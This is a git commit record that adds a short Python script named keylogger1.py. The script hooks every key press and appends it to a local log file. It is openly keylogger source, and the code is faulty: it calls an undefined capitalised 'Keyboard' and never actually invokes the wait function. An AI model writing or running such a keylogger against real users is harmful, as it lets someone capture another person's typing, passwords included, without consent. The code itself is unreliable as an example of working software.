6f3636170d459dbf1f089ec880e47243be6bec25
Jomiloju <oluwajomilojuadetayo@gmail.com>
2024-06-26 13:05:02 +0100

    First read me

---
+++ keylogger1.py
@@ -0,0 +1,12 @@
+import keyboard
+log_file = "keystrokes.log"
+
+def on_key_press(event):
+    with open(log_file, "a") as f:
+        f.write(event.name)
+
+Keyboard.on_press(on_key_press)
+
+# keep the program running to continue to logging keystrokes
+keyboard.wait
+
